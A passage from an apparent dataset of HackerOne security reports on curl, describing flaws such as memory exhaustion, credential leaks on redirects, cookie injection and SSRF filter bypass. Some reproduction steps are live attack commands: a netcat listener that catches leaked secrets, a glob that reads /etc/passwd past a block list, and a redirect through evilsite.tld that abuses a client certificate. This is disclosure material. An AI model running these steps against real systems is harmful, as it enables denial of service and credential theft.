    "original_report": "Summary:\n--------\n\nCurl does not prevent resource consumption when processing certain header types, but keeps on allocating more and more resources until the application terminates (or the system crashes, see below).\n\nThe attack vectors include (at least):\n\n* Sending many `Transfer-Encoding`with repeated encodings such as \"gzip,gzip,gzip,...\"\n* if `CURLOPT_ACCEPT_ENCODING` is set sending many `Content-Encoding` with repeated encodings such as \"gzip,gzip,gzip,...\"\n* Sending many `Set-Cookie` with unique cookie names and about 4kbyte value\n\nSteps To Reproduce:\n-------------------\n\n1.Run the following HTTP server:\n`perl -e 'print \"HTTP/1.1 200 OK\\r\\n\";for (my $i=0; $i < 10000000; $i++) { printf \"Transfer-Encoding: \" . \"gzip,\" x 20000 . \"\\r\\n\"; }' | nc -v -l -p 9999`\n2. `curl http://localhost:9999`\n\nThe application will terminate when it runs out of memory.\n\nOn macOS the app dies due to OOM:\n\nOn linux it's the same:\n\nWhen targeting Windows 11 system the system would stop responding. Once the attack script was terminated the system would not recover after 10 minutes of waiting. While it was possible to log on to the system the display would remain black. Rebooting the system was necessary to recover the system to a working state. This of course is likely due to bugs in the Windows operating system or drivers.\n\nOn other platforms nasty effects may also occur, such as causing extreme swapping or a system crash. Depending on how the system handles the application gobbling all memory it may result in collateral damage, for example when kernel attempts to release system resources by killing processes.\n\nImpact\n------\n\n* Uncontrolled resource consumption\n* Uncontrolled application termination\n* System crash (on some platforms)"
},
{
    "url": "https://hackerone.com/reports/1573634",
    "original_report": "Summary:\n--------\n\nCurl fails to preserve file permissions when writing:\n\n* `CURLOPT_COOKIEJAR` database\n* `CURLOPT_ALTSVC` database\n* `CURLOPT_HSTS` database\n\nInstead the permissions is always reset to 0666 & ~umask if the file is updated.\n\nAs a result a file that was before protected against read access by other users becomes other user readable (as long as umask doesn't have bit 2 set).\nOut of these files only the `CURLOPT_COOKIEJAR` is likely to contain sensitive information.\n\nIn addition curl will replace softlink to the database with locally written database, or if the application is run privileged, specifying `\"/dev/null\"` as a file name can lead to system overwriting the special file and result in inoperable system.\n\nThis is [CWE-281](/hacktivity/cwe_discovery?id=cwe-281): Improper Preservation of Permissions\n\nSteps To Reproduce:\n-------------------\n\n1. `umask 022`\n2. `install -m 600 /dev/null cookie.db`\n3. `curl -b cookie.db -c cookie.db https://google.com`\n4. `ls -l cookie.db`\n\nAt least for `CURLOPT_COOKIEJAR` this vulnerability was introduced in <https://github.com/curl/curl/commit/b834890a3fa3f525cd8ef4e99554cdb4558d7e1b> - this change was introduced to fix a issue <https://github.com/curl/curl/issues/4914>\n\nFix recommendations\n-------------------\n\nIf a file file is created and moved over a the old one, only do this if the file is regular file. Anything else is likely going to end up causing unexpected behaviour, outright failing, or if the user has high enough permissions, damage to the operating system.\n\nSafe cloning of file permissions can only be achieved if the owner / group of the file match the current user (else group permissions might be incorrect). Hence creating a new file and moving it over the old one should IMO only be attempted if the file user and group match that of the previous file.\n\nIf a method of creating a new file is still desired, something like this could be attempted to cover the most use cases:\n\nImpact\n------\n\nLeak of sensitive information"
},
{
    "url": "https://hackerone.com/reports/1590071",
    "original_report": "Summary:\n--------\n\nlibcurl handles `gss_unwrap` `GSS_S_BAD_SIG` error incorrectly. This enables malicious attacker to inject arbitrary FTP server responses to GSSAPI protected FTP control connection and/or make the client consume unrelated heap memory as a FTP command response.\n\nThe defective `krb5_decode` function is as follows:\n\nNote how `read_data` function will set the `buf->size` to result of the decode operation as-is without considering possible `-1` return code and that size `buf->size` is of type `size_t`:\n\nWhen `gss_unwrap` returns an error the `krb5_decode` code attempts to erase the buffer by prefixing the buffer with `599 \\0`. However, this doesn't take into account the case that arbitrary number of bytes can be read by `read_data` function. Hence the buffer may contain multiple lines not just one. The attacker merely needs to find a position in the FTP protocol where ftpcode `599` doesn't lead to connection termination to take over the GSSAPI protected FTP session control channel. From that point onwards the server responses can be forged by the attacker (but need to be predicted, as the attacker has no direct knowledge of the actual commands sent to the server).\n\nIt's also notable that the any `gss_unwrap` error leading to `-1` size will lead to `sec_recv` consuming unallocated heap buffer via `buffer_read` if the reading application keeps reading more data:\n\nThis can lead to disclosure of confidential information from the heap - depending on application this may reveal application secrets to the user (for example via verbose error messages). This is a local leak however, so this impact is only meaningful if the information in heap is normally hidden from the user.\n\nImpact\n------\n\n* Injection of arbitrary FTP control channel server responses to supposedly GSSAPI protected FTP session.\n* Potential leak of local heap memory to client.\n\nThe practical impact of this vulnerability is rather low, considering the rarity of Kerberos FTP and requirement of either man in the middle or victim connecting to malicious server."
},
{
    "url": "https://hackerone.com/reports/1569926",
    "original_report": "Summary:\n--------\n\nCurl can leak user credentials if use two url.\n\nSteps To Reproduce:\n-------------------\n\n1. curl -I -v -u aaa:bbb hackerone.com curl.se\n2. the output is:\n   > Connected to hackerone.com (104.16.100.52) port 80 ([#0](/reports/0))  \n   > Server auth using Basic with user 'aaa'  \n   > HEAD / HTTP/1.1  \n   > Host: hackerone.com  \n   > Authorization: Basic YWFhOmJiYg==  \n   > User-Agent: curl/7.83.1  \n   > Accept: */*\n\n> Connection [#0](/reports/0) to host hackerone.com left intact  \n> Trying 151.101.65.91:80...  \n> Connected to curl.se (151.101.65.91) port 80 ([#1](/reports/1))  \n> Server auth using Basic with user 'aaa'  \n> HEAD / HTTP/1.1  \n> Host: curl.se  \n> Authorization: Basic YWFhOmJiYg==  \n> User-Agent: curl/7.83.1  \n> Accept: */*\n\n3. from the output we can see, the second url get the same credentials\n\nImpact\n------\n\nLeak of confidential information (user credential)"
},
{
    "url": "https://hackerone.com/reports/1572120",
    "original_report": "Summary:\n--------\n\n[add summary of the vulnerability]\n\nThe curl \"globbing\" allows too much scope, which can cause the server to be denied service or used to attack third-party websites. The globbing allow [1-9999999999999999999] to parse in the url. So when curl request for '[http://127.0.0.1/[1-9999999999999999999]'](http://127.0.0.1/%5B1-9999999999999999999%5D'), the can cause 300 requests in the server.\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1. Listen 8000 port: python -m SimpleHTTPServer 8000\n2. command: nohup ./curl -vv '[http://127.0.0.1:8000/[1-9999999999999999999]/'](http://127.0.0.1:8000/%5B1-9999999999999999999%5D/') &\n3. Check the server resource process. There are a lot of network requests and CPU consumption.\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nImpact\n------\n\nWith this function, the resources of the server running curl request can be excessively consumed or a large number of URL accesses to other websites can be initiated, resulting in denial of service."
},
{
    "url": "https://hackerone.com/reports/1564922",
    "original_report": "Summary:\n--------\n\nA similiar issue to [CVE-2019-5435](https://hackerone.com/reports/547630)\n\nSteps To Reproduce:\n-------------------\n\n### analysis\n\nDICT protocol can use one url like \"dict://localhost:3306\", and function unescape\\_word() is used to deal with the character in url like this comment\n\nand the bug case here /curl/lib/dict.c\n\nIn my analysis(maybe wrong), the `inputbuff` in DICT url is \"dict:[inputbuff]\", for example \"//localhost:3306\" in \"dict://localhost:3306\", and `len` is the length of `inputbuff`.\n\nAnd the length of `inputbuff` multiplied by 2 and then passed to malloc. This may lead to a integer overflow on a 32bit OS when the inputbuff is longer than 2GB\n\n`unescape_word` was called by dict\\_do(), If someone use libcurl to code, and call dict\\_do() with a extreme long url, it might be triggered.\n\nImpact\n------\n\nIt might leads to a crash or some other impact."
},
{
    "url": "https://hackerone.com/reports/1555440",
    "original_report": "Steps To Reproduce:\n-------------------\n\nlib/telnet.c suboption function incorrecly checks for the sscanf return value. Instead of checking that 2 elements are parsed, the code also continues if just one element matches:\nif(sscanf(v->data, \"%127[^,],%127s\", varname, varval)) {\nAs such it is possible to construct environment values that don't update the varval buffer and instead use the previous value. In combination of advancing in the temp buffer by strlen(v->data) + 1, this means that there will be uninitialized gaps in the generated output temp buffer. These gaps will contain whatever stack contents from previous operation of the application.\nFortunately the environment is controlled by the client and not the server. As such this vulnerability can't be exploited by the server. Practical exploitation is limited by the following requirements:\nattacker is able to control the environment passed to libcurl via CURLOPT\\_TELNETOPTIONS (\"NEW\\_ENV=xxx,yyy\") and control xxx and yyy in the curl\\_slist entries)\nattacker is able to either inspect the network traffic of the telnet connection or to select the server/port the connection is established to\nWhen both are true the attacker is able to some content of the stack. Note however that for this leak to be meaningful, some confidential or sensitive information would need to be leaked. This could happen if some key or other sensitive material (that is otherwise out of the reach of the attacker, due to for example setuid + dropping of privileges, or for example only being able to execute the command remotely in a limited fashion, for example php curl, or similar) would thus become visible fully, or partially. The leak is limited to maximum about half of the 2048 byte temp buffer.\nSteps To Reproduce:\nRun telnet service\ntcpdump -i lo -X -s 65535 port 23\nExecute\n\nImpact\n------\n\nlib/telnet.c suboption function incorrecly checks for the sscanf return value. Instead of checking that 2 elements are parsed, the code also continues if just one element matches:\nif(sscanf(v->data, \"%127[^,],%127s\", varname, varval)) {\nAs such it is possible to construct environment values that don't update the varval buffer and instead use the previous value. In combination of advancing in the temp buffer by strlen(v->data) + 1, this means that there will be uninitialized gaps in the generated output temp buffer. These gaps will contain whatever stack contents from previous operation of the application.\nFortunately the environment is controlled by the client and not the server. As such this vulnerability can't be exploited by the server. Practical exploitation is limited by the following requirements:\nattacker is able to control the environment passed to libcurl via CURLOPT\\_TELNETOPTIONS (\"NEW\\_ENV=xxx,yyy\") and control xxx and yyy in the curl\\_slist entries)\nattacker is able to either inspect the network traffic of the telnet connection or to select the server/port the connection is established to\nWhen both are true the attacker is able to some content of the stack. Note however that for this leak to be meaningful, some confidential or sensitive information would need to be leaked. This could happen if some key or other sensitive material (that is otherwise out of the reach of the attacker, due to for example setuid + dropping of privileges, or for example only being able to execute the command remotely in a limited fashion, for example php curl, or similar) would thus become visible fully, or partially. The leak is limited to maximum about half of the 2048 byte temp buffer.\nSteps To Reproduce:\nRun telnet service\ntcpdump -i lo -X -s 65535 port 23\nExecute"
},
{
    "url": "https://hackerone.com/reports/1589847",
    "original_report": "Summary:\n--------\n\nlibcurl HTTP/2 support processes incoming `PUSH_PROMISE` headers by storing them in an array. The code initially allocates storage for 10 headers and then keeps doubling the array size as needed:\n\n(<https://github.com/curl/curl/blob/07a9b89fedaec60bdbc254f23f66149b31d2f8da/lib/http2.c#L1053>)\n\nOn 32-bit platforms after receiving 10 << 26 headers the the allocation size will overflow, resulting in too little memory being allocated (`(10 << 27) * sizeof(char *)` will be truncated to lower 32-bit resulting in 1 GB storage being allocated) for the array. Subsequently the pointers will be written to unallocated memory by `stream->push_headers[stream->push_headers_used++] = h;`\n\nSteps To Reproduce:\n-------------------\n\n1. Have HTTP2 server that sends more than 1 << 26 `PUSH_PROMISE` headers\n2. `curl https://targetsite`\n\nThe fix is to limit the amount of promise headers that are accepted and return error if too many are received.\n\nImpact\n------\n\nHeap overflow.\n\nThis issue is likely very hard to trigger as it requires a system where realloc for `(1 << 26) * sizeof(char *)` bytes is successful. This is rather rare. In addition to be exploitable in other than denial of service capacity the attacker would need to find out some way way to obtain code execution by the array overflow. This would likely work by having some object get allocated to the newly released heap memory and then get overwritten by this array pointer write. An example would be an object that has pointer to command to execute.\n\nAs such the practical impact of this vulnerability is low."
},
{
    "url": "https://hackerone.com/reports/1590102",
    "original_report": "Summary:\n--------\n\nlibcurl doesn't fail the FTP connection if Kerberos authentication fails for some reason, but rather reverts back to using regular clear text password authentication.\n\nThe logic is in`lib/ftp.c` `ftp_statemachine`: <https://github.com/curl/curl/blob/07a9b89fedaec60bdbc254f23f66149b31d2f8da/lib/ftp.c#L2706>\n\nThis means that active attacker in a man in the middle position can downgrade any attempt to use Kerberos FTP to regular one by merely forcing the Kerberos authentication to fail.\n\nThe more secure course of action would be to fail the FTP connection if Kerberos authentication fails. If such change is not deemed necessary the current limitations should be documented.\n\nSteps To Reproduce:\n-------------------\n\n1. MitM the connection and make the kerberos authentication fail\n2. `curl --krb private ftp://victim.tld/`\n\nImpact\n------\n\n* Security level downgrade."
},
{
    "url": "https://hackerone.com/reports/1555441",
    "original_report": "Summary:\n--------\n\nCurl is prone to a DoS attack in case the NSS TLS library is used and the CERTINFO option is enabled. Using maliciously crafted certificates on a server, an attacker can make curl run into an endless loop when connecting to the server. The bug is located in the following code segment (<https://github.com/curl/curl/blob/master/lib/vtls/nss.c#L1014>):\n\nWhen CERTINFO is set, display\\_conn\\_info() executes the above shown code, which tries to count the certificates in the chain received from servers via TLS. To this end, display\\_conn\\_info() starts with the leaf certificate and attempts to find its issuer certificate in the chain. The issuer certificate then becomes the origin for the next iteration. This step is repeated until there either is no issuer certificate or a root (= self-signed) certificate is found. However, if the received certificate chain contains a loop, this exit condition is never reached and display\\_conn\\_info() runs into an endless loop. To craft a loop, it is sufficient to have two CA certificates that mutually list each other as issuers (see attached PoC).\n\nSteps To Reproduce:\n-------------------\n\nI have implemented a small PoC where a Webserver uses a maliciously crafted certificate chain that contains a loop. To this end, the end-entity certificate for localhost is issued by CA2, whose certificate is issued by CA1, whose certificate in turn is issued by CA2 (-> loop). The Python script for the Webserver and the certificate chain are attached to this report. To trigger the DoS in curl, the following steps need to be executed:\n\n1. Modify URL in certinfo example (<https://github.com/curl/curl/blob/master/docs/examples/certinfo.c#L46>) to point to `https://localhost:4443/` instead of `https://www.example.com/` (`url_easy_setopt(curl, CURLOPT_URL, \"https://localhost:4443/\")`)\n2. Build curl with NSS TLS library (./configure --with-nss) and with examples (make examples)\n3. Execute python script attached to this report to start the attacker's Webserver\n4. Execute certinfo (doc/examples/certinfo)\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* https\\_server.py (poc webserver)\n* key.pem (poc webserver key)\n* combined\\_loop.pem (poc webserver certificate chain)\n\nImpact\n------\n\nAn attacker who controls a server that a libcurl-using application (with NSS and enabled CERTINFO) connects to, can trigger a DoS. In this case, the application runs into an infinite loop and consumes nearly 100% CPU.\n\nUsing the CVSS calculator, I initially came up with medium severity (5.3). However, because the vulnerabilities relies on CERTINFO being enabled and NSS being used, which is not that popular and will soon be deprecated (<https://curl.se/dev/deprecate.html>), I eventually estimate the severity to be low."
},
{
    "url": "https://hackerone.com/reports/1568175",
    "original_report": "Summary:\n--------\n\n[add summary of the vulnerability]\n\nCurl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect , like the Proxy-Authorization 、x-auth-token header. It is a bypass of fix <https://hackerone.com/reports/1547048> , [CVE-2022-27776](/hacktivity/cve_discovery?id=CVE-2022-27776) .\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1. Create a 302.php file, such as:\n\nAdd the 2 record in the /etc/hosts file:\n\n2. curl -H \"Proxy-Authorization: secrettoken\" <http://b.com/302.php> -vv -L\n   The redirect will be followed, and the confidential headers sent over insecure HTTP to the specified port:\n\n3. curl -H \"x-auth-token: secrettoken\" <http://b.com/302.php> -vv -L\n\nThe reason for the problem is that curl's filtering of authentication header header is incomplete. The Proxy-Authorization and x-auth-token headers are not considered, only restrict the delivery of Cookies and Authorization.\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n  <https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization>\n\nImpact\n------\n\nLeak of Proxy-Authorization and x-auth-token headers."
},
{
    "url": "https://hackerone.com/reports/1566462",
    "original_report": "Summary:\n--------\n\n[add summary of the vulnerability]\n\nThe uri path error could lead to security filter bypasses.\nFor example,\nwe can use curl -vv 'f[h-j]le:///etc/passwd' to bypass file protocol black list\nwe can use curl -vv '[http://1.1.1.1:[80-9000]'](http://1.1.1.1:%5B80-9000%5D') to scan the open port in the host\netc ...\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\ncurl -vv 'f[h-j]le:///etc/passwd' will parse 3 request , like curl -vv 'fhle:///etc/passwd' 、curl -vv 'file:///etc/passwd' 、curl -vv 'fjle:///etc/passwd'\n\nSo, I think this is a security questions of curl, because the wget doesn't have same question. Thinks\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nImpact\n------\n\nbypass the security filter like the SSRF/RFL/LFI etc."
},
{
    "url": "https://hackerone.com/reports/1567257",
    "original_report": "Summary:\n--------\n\nOnce a bearer token is set with `CURLOPT_XOAUTH2_BEARER`, each HTTP request done with the same handler leaks the token itself.\n\nSteps To Reproduce:\n-------------------\n\nGiven the following code:\n\nAddressSanitizer reports a memory leak:\n\nand valgrind does too:\n\nSupporting Material/References:\n-------------------------------\n\nAs mentioned in curl's SECURITY-PROCESS.md, \"small memory leaks\" do not account for vulnerabilities, but as I describe below this leak can be triggered multiple times very easily. I thus preferred reporting this in private form to be on the safe side.\n\nSome more info about my environment:\n\nI can also confirm that the issue is still present in the latest master (commit 1ddc8aefb2e45def02dfe02973a3afd2fbdf09c3) - and this time as curl has been built from source AddressSanitizer is able to provide a more helpful error message:\n\nImpact\n------\n\nAs bearer tokens don't have a standardized length, applications usually don't impose limits on it. If a user is able to set a big bearer token and perform an arbitrary number of meaningless requests it could slowly eat up all system's memory.\n\nIn particular, substituting the bearer string literal with a user-supplied input (let's say `argv[1]`) an attacker could pass in a token as large as roughly 45 kilobytes, which would result in 45 kilobytes of leaked memory on each request that could sum up to hundreds or thousands of megabytes on long-running services. This could eventually lead to the service being killed by the OOM killer, as well as slow downs of overall system performance, especially in constrained environments.\n\nThe example reported above, if substituting `argv[1]` to the literal and simulating a high number of requests with a for loop, leads to the following memory usage:\n\nThis example is taken to the extreme, but 40 MiB in one minute and a half is a big amount of leaked memory nonetheless.\n\nIt is also worth noting that the leaked data is fairly sensitive, as bearer tokens are widely used for authentication in a variety of places (e.g. REST APIs)."
},
{
    "url": "https://hackerone.com/reports/1560324",
    "original_report": "Summary:\n--------\n\nCurl allows injecting cookies over insecure HTTP connection that will then be sent to the target site when connecting over HTTPS.\n\nAs documented in lib/cookie.c <https://github.com/curl/curl/blob/a04f0b961333e1a19848d073d8c7db9c20b2a371/lib/cookie.c#L1039> this should not be possible:\n\nThis will allow session fixation ([CWE-384](/hacktivity/cwe_discovery?id=cwe-384)) attack where the attacker replaces the session of the victim with their own. If the victim performs for example upload operations the upload will be sent to the account controlled bit he attacker.\n\nThis attack requires that the application in question does or can be coaxed to make accesses to the same host over insecure HTTP connection. The attacker needs to either perform Man in the Middle attack to these insecure connections, or be able to host a HTTP server on another port on the same host.\n\nSteps To Reproduce:\n-------------------\n\n1. Set up a HTTPS server that will respond to requests setting the SESSIONID cookie. This simulates the victim accessing the site normally. Note that the cookie has *secure* attribute:\n2. Access the site with curl to simulate a victim login:\n3. Simulate the attacker either performing a MitM attack or being able to host HTTP on another port on the same host:\n4. Simulate the victim visiting the attacker controlled content:\n5. Start HTTPS server that will dump the Cookie headers sent by libcurl:\n6. Simulate the victim accessing the target site again:\n\nThe following cookies are now sent by curl:\n`Cookie: SESSIONID=victimstoken; SESSIONID=hackerstoken`\n\nThe order the cookies appears to depend on the order of the lines in cookie store. Depending on how the victim site interpreted the multiple SESSIONID cookies the attacker may want to try to inject the cookie before login by the victim, or after the login.\n\nAfter successful attack the cookie.txt looks like this:\n\nThis is [CWE-384](/hacktivity/cwe_discovery?id=cwe-384): Session Fixation.\n\nImpact\n------\n\nCookie injection leading to [CWE-384](/hacktivity/cwe_discovery?id=cwe-384): Session Fixation and/or other similar attacks."
},
{
    "url": "https://hackerone.com/reports/1557449",
    "original_report": "curl allows users to load a HSTS cache which will cause curl to use HTTPS instead of HTTP given a HTTP URL for a given site specified in the HSTS cache.\n\nIf the trailing dot is used, the HSTS check will be bypassed.\n\nIf a user has a preloaded hsts.txt:\n\nDoing the following:\n\nWill cause accounts.google.com to be loaded over HTTP\n\nThis issue has been raised in other HTTP clients before such as in <https://bugs.chromium.org/p/chromium/issues/detail?id=461481> and <https://www.mozilla.org/en-US/security/advisories/mfsa2015-13/>\n\nImpact\n------\n\nHSTS bypass"
},
{
    "url": "https://hackerone.com/reports/1553841",
    "original_report": "Summary:\n--------\n\nURL decoding the entire proxy string could lead to SSRF filter bypasses. For example,\n\nWhen the following curl specifies the proxy string `http://example.com%2F127.0.0.1`\n\n* If curl URL parser or another RFC3986 compliant parser parses the initial string <http://127.0.0.1%2F.example.com>, it will derive 127.0.0.1%2Fexample.com or 127.0.0.1/example.com as the host, if for instance, an SSRF check is used to determine if a host ends with .example.com (.example.com being a allow-listed domain), the check will succeed.\n* curl will then URL decode the entire proxy string to <http://127.0.0.1/example.com> and send it to the server\n\n* This proxy string is valid, and proxy servers, even RFC3986-compliant ones will send the request to the host 127.0.0.1\n\nSteps To Reproduce:\n-------------------\n\nI switched things up and used 127.0.0.1 as the allow-listed server and example.com as the target server to make it easier (no need to setup a HTTP server) to reproduce.\n\n1. I used <https://github.com/abhinavsingh/proxy.py> as my proxy server.\n2. Perform the following:\n\n3. You will receive a malformed response\n\nHowever, this response is actually being returned by example.com, the reason is that proxy.py will forward the Host header, currently 127.0.0.1/example.com curl sends it, making it a Blind SSRF\n\n4. If\n\n* an attacker can control the host header either via curl itself\n* the proxy does not forward the host header curl sends,\n* or if servers which ignore the Host header entirely such as Express is used,\n  it is possible to read the full response\n\nRecommended Fix:\n----------------\n\nThe recommended fix for this is to not URL decode the host component of the proxy string when passing to proxy server.\n\nImpact\n------\n\nSSRF filter bypass at if the curl URL parser or a RFC 3986 parser is used, it could lead to blind / full SSRF depending on the proxy used."
},
{
    "url": "https://hackerone.com/reports/1555796",
    "original_report": "Summary:\n--------\n\nCurl fails to consider some security related options when reusing TLS connections. For example:\n\n* CURLOPT\\_SSL\\_OPTIONS\n* CURLOPT\\_PROXY\\_SSL\\_OPTIONS\n* CURLOPT\\_CRLFILE\n* CURLOPT\\_PROXY\\_CRLFILE\n\nAs a result for example TLS connection with lower security (`CURLSSLOPT_ALLOW_BEAST`, `CURLSSLOPT_NO_REVOKE`) connection reused when it should no longer be. Also connection that has been authenticated perviously with `CURLSSLOPT_AUTO_CLIENT_CERT` might be reused for connections that should not be.\n\nSteps To Reproduce:\n-------------------\n\n1. `(echo -ne \"HTTP/1.1 200 OK\\r\\nContent-Length: 6\\r\\n\\r\\nHello\\n\"; sleep 5; echo -ne \"HTTP/1.1 200 OK\\r\\nContent-Length: 6\\r\\n\\r\\nAgain\\n\") | openssl s_server -cert cert.pem -key privkey.pem -cert_chain chain.pem -accept 9443`\n2. `curl -v --ssl-no-revoke --ssl-allow-beast https://targethost.tld:9443 -: https://targethost.tld:9443`\n\nConnections are made using the same reused connection even though security settings change.\n\nWith curl built against openssl:\n\n1. `curl http://cdp.geotrust.com/GeoTrustRSACA2018.crl | openssl crl -out testcrl.pem`\n2. `curl -v https://curl.se -: --crlfile crlfile.pem https://curl.se`\n\nThe crlfile.pem use should result in `curl: (60) SSL certificate problem: unable to get certificate CRL` but is ignored since previous connection is reused.\n\nWith curl built against Schannel and revoked certificate:\n\n1. `curl -v --ssl-no-revoke https://revoked.grc.com -: https://revoked.grc.com`\n\nSecond connection will reuse the existing connection even though revocation check is no longer requested.\n\nNote:\n-----\n\nThere may be more options that might have the similar issues. These were the most obvious I could see (ones having obvious security impact).\n\nImpact\n------\n\nWrong identity (client certificate) or TLS security options being used for subsequent connections to the same hosts."
},
{
    "url": "https://hackerone.com/reports/1553301",
    "original_report": "Summary:\n--------\n\nIn [CVE-2014-3620](/hacktivity/cve_discovery?id=CVE-2014-3620) curl prevents cookies from being set for Top Level Domains (TLDs). According to the advisory, curl's \"cookie parser has no Public Suffix awareness\", but it will \"reject TLDs from being allowed\". However, a cookie can still be set for a TLD + trailing dot.\n\nA trailing dot after a TLD is considered legal and curl will send the <http://example.com.> to <http://example.com>\n\nSteps To Reproduce:\n-------------------\n\n1. Create an Apache file like the following\n\n2. Now save the cookie to curl and see the cookie is set for .me.\n\ncookies.txt:\n\n3. Requests sent via curl to the domain with TLD + '.' will now contain the particular cookie.\n\nImpact\n------\n\nCookies can be set by arbitrary sites for TLD + \".\", and if a trailing dot is used for an unrelated site, curl will send the cookie to the unrelated site."
},
{
    "url": "https://hackerone.com/reports/1553598",
    "original_report": "Summary:\n--------\n\nCurl command has a logic flaw that results in removal of a wrong file when combining `--no-clobber` and `--remove-on-error` if the target file name exists and an error occurs.\n\nSteps To Reproduce:\n-------------------\n\n1. `echo \"important file\" > foo`\n2. `echo -ne \"HTTP/1.1 200 OK\\r\\nContent-Length: 666\\r\\n\\r\\nHello\\n\" | nc -l -p 9999`\n3. `curl -m 3 --no-clobber --remove-on-error --output foo http://testserver.tld:9999/`\n4. `ls -l foo*`\n5. `cat foo.1`\n\n`-m 3` is used here to simulate a denial of service of the connection performed by the attacker.\n\nThe bug appears to happen because the remote-on-error `unlink` is called without considering the no-clobber generated file name:\n\n* no-clobber name generation; <https://github.com/curl/curl/blob/3fd1d8df3a2497078d580f43c17311e6f58186a1/src/tool_cb_wrt.c#L88>\n* remove-on-error unlink: <https://github.com/curl/curl/blob/f7f26077bc563375becdb2adbcd49eb9f28590f9/src/tool_operate.c#L598>\n\nImpact\n------\n\nRemoval of a file that was supposed not to be overwritten (data loss). Incomplete file left of disk when it should have been removed. This can lead to potential loss of integrity or availability.\n\nFor this attack to work the attacker of course would need to know a scenario where the victim is performing curl operation with `--no-clobber` `--remove-on-error` options."
},
{
    "url": "https://hackerone.com/reports/1563061",
    "original_report": "Summary:\n--------\n\nCurl will reuse existing certificate for further TLS requests when following redirects. This is similar to `CVE 2022-27774` but with narrower impact, as the secret (private key) is not leaked.\n\nSteps To Reproduce:\n-------------------\n\n1. Configure a site (`targetsite.tld`) to require client certificates for authentication\n2. Have `client.crt` and `client.key` that can be used to access this site\n3. Create an attacker controller site `https://evilsite.tld/something` that redirects to `https://targetsite.tld/secretfile`\n4. `curl -L --cert client.crt --key client.key https://evilsite.tld/something`\n5. The redirect is followed and the secretfile content fetched\n\nIn effect the attacker can choose which content is accessed with the client certificate. This proof of concept is of course rather silly as one-liner curl command, but it still demonstrates the inability of libcurl to restrict where key/cert are used. This scenario of course requires that the application in question can be passed attacker controlled URLs and that redirects are followed. If the attacker also wishes to obtain the secretfile response the application in question should be returning the file contents to the request to the attacker (lets assume attacker can pass URLs the app and gets the fetched content back as result).\n\nConfiguring client key/cert for arbitrary requests is unwise. However, since the common understanding is that the client certificate public key is \"useless\" to the attacker without the corresponding private key, it might happen that this (arguably silly) use pattern might exists. It is \"harmless\" after all...\n\nI believe that the key/cert should not used when following a redirect to a different protocol/host/port. This wouldn't prevent the minor leak of the `client.crt` to the attacker, but at least the attacker wouldn't get to choose which resources to access.\n\nThis is [CWE-522](/hacktivity/cwe_discovery?id=cwe-522): Insufficiently Protected Credentials\n\nImpact\n------\n\nThe attacker can control which resource is accessed with the key/cert, and potentially gain unauthorised access to confidential information."
},
{
    "url": "https://hackerone.com/reports/1526328",
    "original_report": "Summary:\n--------\n\nA cached connection authenticated with the OAUTH2 mechanisms can be reused by a subsequent request even if the bearer is not correct.\nThis affects SASL-enabled protcols: SMPTP(S), IMAP(S), POP3(S) and LDAP(S) (openldap only).\n\nAn application that can be accessed by more than one user (such as a webmail server) would be affected by this flaw.\n\nSteps To Reproduce:\n-------------------\n\n`curl 'imap://server:port/path/;MAILINDEX=1' --login-options 'AUTH=OAUTHBEARER' -u user: --oauth2-bearer validbearer --next 'imap://server:port/path/;MAILINDEX=1' --login-options 'AUTH=OAUTHBEARER' -u user: --oauth2-bearer anything`\n\nSupporting Material/References:\n-------------------------------\n\n* Patch 0001-url-check-sasl-additional-parameters-for-connection-.patch fixes this flaw.\n\nAs an alternative to apply the patch, use another (unused) password within each request: the second request in the command below will properly fail.\n`curl 'imap://server:port/path/;MAILINDEX=1' --login-options 'AUTH=OAUTHBEARER' -u user:dummy1 --oauth2-bearer validbearer --next 'imap://server:port/path/;MAILINDEX=1' --login-options 'AUTH=OAUTHBEARER' -u user:dummy2 --oauth2-bearer anything`\n\nImpact\n------\n\nAccess (read/write) unauthorized data"
},
{
    "url": "https://hackerone.com/reports/1547048",
    "original_report": "Summary:\n--------\n\nCurl can be coaxed to leak Authorisation / Cookie headers by redirecting request to http:// URL on the same host. Successful exploitation requires that the attacker can either Man-in-the-Middle the connection or can access the traffic at the recipient side (for example by redirecting to a non-privileged port such as 9999 on the same host).\n\nSteps To Reproduce:\n-------------------\n\n1. Configure for example Apache2 to perform redirect with mod\\_rewrite:\n   ... the attacker could also use `.htpasswd` file to do so.\n2. Set up netcat to listen for the incoming secrets:\n   `while true; do echo -ne 'HTTP/1.1 404 nope\\r\\nContent-Length: 0\\r\\n\\r\\n' | nc -v -l -p 9999; done`\n3. `curl-L -H \"Authorization: secrettoken\" -H \"Cookie: secretcookie\" https://hostname.tld/redirectpoc`\n\nThe redirect will be followed, and the confidential headers sent over insecure HTTP to the specified port:\n\nThe attack could also use HTTPS and a valid certificate, In this case the leaked headers are of course only be visible to the listening http server.\n\nThis vulnerability is quite similar to [CVE-2022-27774](/hacktivity/cve_discovery?id=CVE-2022-27774) and the fix is similar too: If the protocol or port number differs from the original request strip the Authorization and Cookie headers.\n\nThis bug appears to be here: <https://github.com/curl/curl/blob/master/lib/http.c#L1904>\n\nImpact\n------\n\nLeak of Authorisation and/or Cookie headers."
},
{
    "url": "https://hackerone.com/reports/1546268",
